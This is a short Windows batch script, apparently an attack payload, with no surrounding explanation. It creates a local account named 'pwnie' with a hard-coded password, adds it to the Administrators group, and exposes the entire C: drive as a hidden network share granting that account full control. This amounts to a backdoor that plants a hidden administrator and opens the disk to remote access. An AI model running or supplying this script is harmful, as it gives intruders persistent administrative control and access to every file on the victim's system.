@echo OFF
net user pwnie dungothacked /add
net localgroup Administrators pwnie /add
net share HACKED$=C:\ /grant:pwnie,FULL